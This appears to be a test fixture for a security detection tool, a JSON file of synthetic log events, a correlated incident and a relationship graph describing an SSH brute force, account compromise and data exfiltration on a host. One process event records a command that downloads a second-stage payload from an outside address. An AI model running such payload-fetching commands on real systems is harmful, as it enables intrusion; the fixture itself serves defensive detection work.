@@ -1,0 +1,361 @@
+{
+  "events": [
+    {
+      "bytes_out": null,
+      "dst_ip": null,
+      "event_type": "login_failure",
+      "host": "app-07",
+      "id": "fk-001",
+      "metadata": {
+        "parser": "auth"
+      },
+      "process": null,
+      "raw": "Failed SSH login for svc-deploy from 203.0.113.77",
+      "severity": 2,
+      "source": "auth",
+      "src_ip": "203.0.113.77",
+      "timestamp": "2026-09-17T12:10:00Z",
+      "user": "svc-deploy"
+    },
+    {
+      "bytes_out": null,
+      "dst_ip": null,
+      "event_type": "login_failure",
+      "host": "app-07",
+      "id": "fk-002",
+      "metadata": {
+        "parser": "auth"
+      },
+      "process": null,
+      "raw": "Failed SSH login for svc-deploy from 203.0.113.77",
+      "severity": 2,
+      "source": "auth",
+      "src_ip": "203.0.113.77",
+      "timestamp": "2026-09-17T12:10:10Z",
+      "user": "svc-deploy"
+    },
+    {
+      "bytes_out": null,
+      "dst_ip": null,
+      "event_type": "login_failure",
+      "host": "app-07",
+      "id": "fk-003",
+      "metadata": {
+        "parser": "auth"
+      },
+      "process": null,
+      "raw": "Failed SSH login for svc-deploy from 203.0.113.77",
+      "severity": 2,
+      "source": "auth",
+      "src_ip": "203.0.113.77",
+      "timestamp": "2026-09-17T12:10:20Z",
+      "user": "svc-deploy"
+    },
+    {
+      "bytes_out": null,
+      "dst_ip": null,
+      "event_type": "login_failure",
+      "host": "app-07",
+      "id": "fk-004",
+      "metadata": {
+        "parser": "auth"
+      },
+      "process": null,
+      "raw": "Failed SSH login for svc-deploy from 203.0.113.77",
+      "severity": 2,
+      "source": "auth",
+      "src_ip": "203.0.113.77",
+      "timestamp": "2026-09-17T12:10:30Z",
+      "user": "svc-deploy"
+    },
+    {
+      "bytes_out": null,
+      "dst_ip": null,
+      "event_type": "login_failure",
+      "host": "app-07",
+      "id": "fk-005",
+      "metadata": {
+        "parser": "auth"
+      },
+      "process": null,
+      "raw": "Failed SSH login for svc-deploy from 203.0.113.77",
+      "severity": 2,
+      "source": "auth",
+      "src_ip": "203.0.113.77",
+      "timestamp": "2026-09-17T12:10:40Z",
+      "user": "svc-deploy"
+    },
+    {
+      "bytes_out": null,
+      "dst_ip": null,
+      "event_type": "login_success",
+      "host": "app-07",
+      "id": "fk-006",
+      "metadata": {
+        "parser": "auth"
+      },
+      "process": null,
+      "raw": "Successful SSH login for svc-deploy from 203.0.113.77",
+      "severity": 1,
+      "source": "auth",
+      "src_ip": "203.0.113.77",
+      "timestamp": "2026-09-17T12:11:30Z",
+      "user": "svc-deploy"
+    },
+    {
+      "bytes_out": null,
+      "dst_ip": null,
+      "event_type": "process_start",
+      "host": "app-07",
+      "id": "fk-007",
+      "metadata": {
+        "command_line": "wget http://198.51.100.99/stage2.bin",
+        "parser": "process"
+      },
+      "process": "wget",
+      "raw": "New process wget on app-07",
+      "severity": 2,
+      "source": "process",
+      "src_ip": null,
+      "timestamp": "2026-09-17T12:12:00Z",
+      "user": "svc-deploy"
+    },
+    {
+      "bytes_out": 60000000,
+      "dst_ip": "198.51.100.99",
+      "event_type": "network_transfer",
+      "host": "app-07",
+      "id": "fk-008",
+      "metadata": {
+        "demo_destination": false,
+        "parser": "network"
+      },
+      "process": null,
+      "raw": "57 MB outbound transfer from app-07",
+      "severity": 2,
+      "source": "network",
+      "src_ip": "10.0.0.9",
+      "timestamp": "2026-09-17T12:14:00Z",
+      "user": null
+    }
+  ],
+  "incidents": [
+    {
+      "entities": {
+        "destination_ips": [
+          "198.51.100.99"
+        ],
+        "hosts": [
+          "app-07"
+        ],
+        "processes": [
+          "wget"
+        ],
+        "source_ips": [
+          "203.0.113.77"
+        ],
+        "users": [
+          "svc-deploy"
+        ]
+      },
+      "event_ids": [
+        "fk-001",
+        "fk-002",
+        "fk-003",
+        "fk-004",
+        "fk-005",
+        "fk-006",
+        "fk-007",
+        "fk-008"
+      ],
+      "id": "INC-001",
+      "score": 5,
+      "severity": "HIGH",
+      "stages": [
+        "brute_force",
+        "account_compromise",
+        "suspicious_execution",
+        "possible_exfiltration"
+      ],
+      "title": "Potential credential compromise on app-07"
+    }
+  ],
+  "relationships": [
+    {
+      "event_ids": [
+        "fk-001",
+        "fk-002",
+        "fk-003",
+        "fk-004",
+        "fk-005",
+        "fk-006"
+      ],
+      "id": "rel-INC-001-001",
+      "reason": "Repeated authentication attempts targeted the same account.",
+      "relationship_type": "authenticated_as",
+      "source": "ip:203.0.113.77",
+      "target": "user:svc-deploy"
+    },
+    {
+      "event_ids": [
+        "fk-006"
+      ],
+      "id": "rel-INC-001-002",
+      "reason": "The successful post-brute-force login established the compromised host.",
+      "relationship_type": "authenticated_on",
+      "source": "user:svc-deploy",
+      "target": "host:app-07"
+    },
+    {
+      "event_ids": [
+        "fk-007"
+      ],
+      "id": "rel-INC-001-003",
+      "reason": "A controlled-demo suspicious process followed the compromised login.",
+      "relationship_type": "executed_on",
+      "source": "process:wget",
+      "target": "host:app-07"
+    },
+    {
+      "event_ids": [
+        "fk-008"
+      ],
+      "id": "rel-INC-001-004",
+      "reason": "The compromised host sent a large transfer or contacted a marked destination.",
+      "relationship_type": "connected_to",
+      "source": "host:app-07",
+      "target": "ip:198.51.100.99"
+    },
+    {
+      "event_ids": [
+        "fk-001",
+        "fk-002",
+        "fk-003",
+        "fk-004",
+        "fk-005",
+        "fk-006",
+        "fk-007",
+        "fk-008"
+      ],
+      "id": "rel-INC-001-005",
+      "reason": "brute_force occurred before account_compromise for correlated entities.",
+      "relationship_type": "preceded_by",
+      "source": "stage:INC-001:brute_force",
+      "target": "stage:INC-001:account_compromise"
+    },
+    {
+      "event_ids": [
+        "fk-001",
+        "fk-002",
+        "fk-003",
+        "fk-004",
+        "fk-005",
+        "fk-006",
+        "fk-007",
+        "fk-008"
+      ],
+      "id": "rel-INC-001-006",
+      "reason": "account_compromise occurred before suspicious_execution for correlated entities.",
+      "relationship_type": "preceded_by",
+      "source": "stage:INC-001:account_compromise",
+      "target": "stage:INC-001:suspicious_execution"
+    },
+    {
+      "event_ids": [
+        "fk-001",
+        "fk-002",
+        "fk-003",
+        "fk-004",
+        "fk-005",
+        "fk-006",
+        "fk-007",
+        "fk-008"
+      ],
+      "id": "rel-INC-001-007",
+      "reason": "suspicious_execution occurred before possible_exfiltration for correlated entities.",
+      "relationship_type": "preceded_by",
+      "source": "stage:INC-001:suspicious_execution",
+      "target": "stage:INC-001:possible_exfiltration"
+    },
+    {
+      "event_ids": [
+        "fk-001"
+      ],
+      "id": "rel-INC-001-008",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "relationship_type": "correlated_with",
+      "source": "event:fk-001",
+      "target": "incident:INC-001"
+    },
+    {
+      "event_ids": [
+        "fk-002"
+      ],
+      "id": "rel-INC-001-009",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "relationship_type": "correlated_with",
+      "source": "event:fk-002",
+      "target": "incident:INC-001"
+    },
+    {
+      "event_ids": [
+        "fk-003"
+      ],
+      "id": "rel-INC-001-010",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "relationship_type": "correlated_with",
+      "source": "event:fk-003",
+      "target": "incident:INC-001"
+    },
+    {
+      "event_ids": [
+        "fk-004"
+      ],
+      "id": "rel-INC-001-011",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "relationship_type": "correlated_with",
+      "source": "event:fk-004",
+      "target": "incident:INC-001"
+    },
+    {
+      "event_ids": [
+        "fk-005"
+      ],
+      "id": "rel-INC-001-012",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "relationship_type": "correlated_with",
+      "source": "event:fk-005",
+      "target": "incident:INC-001"
+    },
+    {
+      "event_ids": [
+        "fk-006"
+      ],
+      "id": "rel-INC-001-013",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "relationship_type": "correlated_with",
+      "source": "event:fk-006",
+      "target": "incident:INC-001"
+    },
+    {
+      "event_ids": [
+        "fk-007"
+      ],
+      "id": "rel-INC-001-014",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "relationship_type": "correlated_with",
+      "source": "event:fk-007",
+      "target": "incident:INC-001"
+    },
+    {
+      "event_ids": [
+        "fk-008"
+      ],
+      "id": "rel-INC-001-015",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "relationship_type": "correlated_with",
+      "source": "event:fk-008",
+      "target": "incident:INC-001"
+    }
+  ]
+}
